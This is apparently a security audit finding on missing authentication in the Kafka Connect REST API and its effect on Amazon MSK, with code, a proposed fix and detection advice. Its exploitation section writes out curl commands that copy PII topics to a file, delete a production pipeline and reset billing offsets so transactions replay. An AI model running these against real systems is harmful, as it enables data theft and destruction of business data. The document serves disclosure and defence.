# FINDING-004: Kafka Connect REST API — Missing Per-Endpoint Authorization

## Metadata

| Field | Value |
|-------|-------|
| Finding ID | FINDING-004 |
| Target | `apache/kafka` |
| Component | `ConnectorsResource` (Connect REST API) |
| Source File | `connect/runtime/src/main/java/org/apache/kafka/connect/runtime/rest/resources/ConnectorsResource.java` |
| Approximate Lines | 1–407 (entire resource class) |
| Category | RBAC Bypass — Missing Authorization |
| CVSS v3.1 Score | **9.8 CRITICAL** |
| CVSS v3.1 Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| CVSS Breakdown | ISCBase=0.9148, ISC=5.873, Exploit=3.887, Score=Roundup(9.760)=9.8 |
| CWE | CWE-306: Missing Authentication for Critical Function; CWE-284: Improper Access Control |
| Requires Auth | NONE — any network-reachable client can invoke all endpoints |
| MSK Affected | YES — MSK Connect REST API within VPC |

## Summary

The Connect REST API resource class `ConnectorsResource` exposes 20 JAX-RS endpoints (create, delete, update config, pause, resume, stop, alter offsets, reset offsets, restart, etc.) with **zero per-endpoint authorization annotations** (`@RolesAllowed`, `@DenyAll`, `@Secured`). There is no authentication filter registered at the REST server layer. Any client that can reach the Connect worker on port 8083 can invoke every endpoint without any credential.

## Vulnerable Code (verbatim)

```java
@Path("/connectors")
@Produces(MediaType.APPLICATION_JSON)
@Consumes(MediaType.APPLICATION_JSON)
public class ConnectorsResource {

    private final Herder herder;
    // NO @RolesAllowed class-level annotation

    @POST
    // MISSING: @RolesAllowed({"admin"})
    public Response createConnector(@QueryParam("forward") Boolean forward,
                                    ConnectorInfo info) throws Throwable {
        checkAndPutConnectorConfigName(info.name(), info.config());
        return requestHandler.completeOrForwardRequest(
            cb -> herder.putConnectorConfig(info.name(), info.config(), false, cb),
            forward, new TypeReference<ConnectorInfo>() {});
    }

    @DELETE
    @Path("/{connector}")
    // MISSING: @RolesAllowed({"admin"})
    public void destroyConnector(@PathParam("connector") String connector,
                                  @QueryParam("forward") Boolean forward) throws Throwable {
        requestHandler.completeOrForwardRequest(
            cb -> herder.deleteConnectorConfig(connector, cb),
            forward, new TypeReference<Herder.Created<ConnectorInfo>>() {});
    }

    @PUT
    @Path("/{connector}/config")
    // MISSING: @RolesAllowed({"admin"})
    public Response putConnectorConfig(@PathParam("connector") String connector,
                                       @QueryParam("forward") Boolean forward,
                                       Map<String, String> connectorConfig) throws Throwable {
        checkAndPutConnectorConfigName(connector, connectorConfig);
        return requestHandler.completeOrForwardRequest(
            cb -> herder.putConnectorConfig(connector, connectorConfig, true, cb),
            forward, new TypeReference<ConnectorInfo>() {});
    }

    @PATCH
    @Path("/{connector}/offsets")
    // MISSING: @RolesAllowed({"admin"})
    public Response alterConnectorOffsets(@PathParam("connector") String connector,
                                          @QueryParam("forward") Boolean forward,
                                          ConnectorOffsets offsets) throws Throwable {
        return requestHandler.completeOrForwardRequest(
            cb -> herder.alterConnectorOffsets(connector, offsets.toMap(), cb),
            forward, new TypeReference<Message>() {});
    }
}
```

## Root Cause

Apache Kafka Connect's REST server uses Jersey (JAX-RS). Authorization is intentionally left to deployment operators — the framework provides BASIC auth and mutual TLS options, but they are **opt-in** and **not the default**. Out of the box, the REST API has no authentication. The source code contains no mandatory authorization gate at the resource class level, making a zero-auth deployment the path of least resistance.

On MSK Connect, AWS does not add an authentication layer to the worker's REST API. The REST API is accessible to any resource within the VPC security group that includes the Connect worker.

## Attack Prerequisites

- Network access to the Connect worker on port 8083
- No credentials required

## Step-by-Step Exploitation

See `payloads/finding-004-connect-rest-exploit.sh` for all three scenarios.

**Scenario A — Data Exfiltration:**
```bash
curl -X POST http://CONNECT_WORKER:8083/connectors \
  -H "Content-Type: application/json" \
  -d '{
    "name": "exfil-connector",
    "config": {
      "connector.class": "org.apache.kafka.connect.file.FileStreamSinkConnector",
      "tasks.max": "1",
      "topics": "customer-pii,payment-data",
      "file": "/tmp/exfil.txt"
    }
  }'
```

**Scenario B — Pipeline Destruction:**
```bash
curl -X DELETE http://CONNECT_WORKER:8083/connectors/production-etl-pipeline
```

**Scenario C — Offset Manipulation (Transaction Replay):**
```bash
curl -X PUT http://CONNECT_WORKER:8083/connectors/billing-connector/stop
curl -X DELETE http://CONNECT_WORKER:8083/connectors/billing-connector/offsets
# Connector will replay ALL historical messages on next start
```

## Expected Outcome

All three scenarios succeed without any authentication. The REST API processes every request as if it were issued by a trusted administrator.

## Amazon MSK Specific Impact

- **MSK Connect:** Connect workers run in AWS-managed ECS-like environments within the customer's VPC. The REST API port (8083) is accessible to any resource in the same security group
- **IAM Role escalation:** When a malicious connector is created (Scenario A), it runs with the MSK Connect execution role's permissions. If the role has `kafka-cluster:*`, the attacker gains full Kafka read/write access via a connector they control
- **Lateral movement:** From a connector, an attacker can read any Kafka topic the execution role has access to, including topics containing AWS credentials, API keys, or internal service tokens
- **No AWS service control:** AWS does not wrap the REST API with API Gateway or any IAM-aware proxy — the exposure is direct TCP within the VPC

## Proposed Fix

Enable Basic Authentication extension in Connect:
```properties
# In connect-distributed.properties:
rest.extension.classes=org.apache.kafka.connect.rest.basic.auth.extension.BasicAuthSecurityRestExtension
```

Or restrict the listener to localhost and use a sidecar proxy:
```properties
listeners=HTTP://127.0.0.1:8083
rest.advertised.host.name=127.0.0.1
```

For MSK Connect: AWS should provide IAM-authenticated REST API access, similar to how MSK broker access is IAM-controlled.

## Detection

- **VPC Flow Logs:** Connections to port 8083 from unexpected sources within the VPC
- **MSK Connect metrics:** Sudden new connector appearances or connector deletions in CloudWatch
- **CloudTrail:** MSK Connect `UpdateConnector` or `DeleteConnector` API calls via the AWS control plane are logged — but REST API calls to the worker are NOT logged in CloudTrail (data plane blind spot)
